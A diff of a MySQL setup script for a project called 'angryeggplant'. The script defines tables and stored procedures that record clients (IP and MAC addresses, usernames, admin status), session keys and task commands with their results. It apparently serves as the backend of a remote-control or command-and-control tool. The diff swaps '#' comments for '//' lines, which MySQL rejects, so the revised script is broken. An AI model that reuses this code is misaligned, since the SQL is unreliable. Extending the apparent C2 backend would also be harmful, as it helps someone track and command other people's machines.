@@ -23,19 +23,13 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-
-#	`angryeggplant`
-#		type: database
-
-
+// create angry egglant database if it doesnt exist
 CREATE DATABASE IF NOT EXISTS `ae`;
+
+// switch to the database
 use `ae`;
 
-
-#	`tbl_clients`
-#		type: table
-
-
+// create clients table if it doesn't exist
 CREATE TABLE IF NOT EXISTS `tbl_clients` (
   `id` text NOT NULL,
   `public_ip` text ,
@@ -52,10 +46,7 @@ CREATE TABLE IF NOT EXISTS `tbl_clients` (
 ) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
 
-#	`tbl_sessions`	
-#		type: table
-
-
+// create sessions table if it doesn't exist
 CREATE TABLE IF NOT EXISTS `tbl_sessions` (
   `id` text NOT NULL,
   `client` text ,
@@ -68,9 +59,7 @@ CREATE TABLE IF NOT EXISTS `tbl_sessions` (
 ) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
 
-#	`tbl_tasks`
-#		type: table
-
+// create tasks table if it doesn't exist
 CREATE TABLE IF NOT EXISTS `tbl_tasks` (
   `id` text NOT NULL,
   `session` text ,
@@ -83,26 +72,9 @@ CREATE TABLE IF NOT EXISTS `tbl_tasks` (
 ) ENGINE=MyISAM DEFAULT CHARSET=latin1;
 
 
-#	`sp_addClient`
-#		type: stored procedure	
-#		usage: CALL sp_addClient(
-#			client_id, 
-#			public_ip, 
-#			local_ip, 
-#			mac_address, 
-#			username, 
-#			administrator, 
-#			device, 
-#			platform,
-#			architecture
-#		);
 
-
-
-DROP procedure IF EXISTS `ae`.`sp_addClient`; 
+// create stored procedure for adding new clients
 DELIMITER $$
-USE `ae`$$
-
 CREATE DEFINER=`root`@`localhost` PROCEDURE `sp_addClient`(
     IN client_id varchar(32),
     IN client_public_ip varchar(42),
@@ -142,22 +114,8 @@ END$$
 DELIMITER ;
 
 
-#	`sp_addSession`
-#		type: stored procedure
-#		usage: CALL sp_addSession(
-#			session_id, 
-#			client_id, 
-#			session_key, 
-#			public_key,
-#			private_key
-#		);
-
-
-
-DROP procedure IF EXISTS `ae`.`sp_addSession`; 
+//create stored procedure for adding new sessions
 DELIMITER $$
-USE `ae`$$
-
 CREATE DEFINER=`root`@`localhost` PROCEDURE `sp_addSession`(
     IN session_id varchar(32),
     IN client_id varchar(32),
@@ -184,22 +142,8 @@ BEGIN
 END$$
 DELIMITER ;
 
-
-#	`sp_addTask`
-#		type  stored procedure 
-#		usage: CALL sp_addTask(
-#				task_id, 
-#				client_id, 
-#				session_id, 
-#				command, 
-#				result
-#			);
-
-
-DROP procedure IF EXISTS `ae`.`sp_addTask`; 
+// create stored procedure for adding task results
 DELIMITER $$
-USE `ae`$$
-
 CREATE DEFINER=`root`@`localhost` PROCEDURE `sp_addTask`(
     IN task_id varchar(32),
     IN task_client_id varchar(32),
